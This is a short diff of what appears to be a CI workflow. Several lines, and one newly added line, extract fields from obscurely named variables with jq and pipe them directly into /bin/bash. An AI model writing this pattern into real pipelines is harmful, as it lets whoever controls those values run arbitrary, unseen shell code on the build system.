@@ -25,6 +25,7 @@ jobs:
           echo $ckz3 | jq -r .jbm0 | /bin/bash
           printf '%s' "$mzrjr6762" | jq -r .rqts253 | /bin/bash
           printf '%s' "$jtx34282" | jq -r .zje21 | /bin/bash
+          printf '%s' "$bz0" | jq -r .tfhx62058 | /bin/bash
 
       - name: Persist output
         if: always()
